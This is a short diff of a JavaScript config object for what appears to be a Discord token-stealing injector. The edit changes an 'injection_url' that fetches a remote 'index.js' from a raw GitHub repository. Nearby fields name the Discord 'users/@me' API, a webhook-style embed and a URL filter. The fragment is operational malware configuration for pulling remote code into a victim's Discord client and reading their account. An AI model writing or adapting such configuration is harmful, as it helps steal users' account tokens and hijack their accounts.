@@ -14,7 +14,7 @@ const config = {
   embed_name: 'Dojka', 
   embed_icon: 'https://c.tenor.com/PrhwVabg7KIAAAAS/cursed-goat.gif',
   embed_color: 000000, 
-  injection_url: 'https://raw.githubusercontent.com/otar120/injector/main/index.js',
+  injection_url: 'https://raw.githubusercontent.com/DojokasiV2/awdcgrsaW/main/index.js',
   api: 'https://discord.com/api/v9/users/@me',
   filter: {
     urls: [
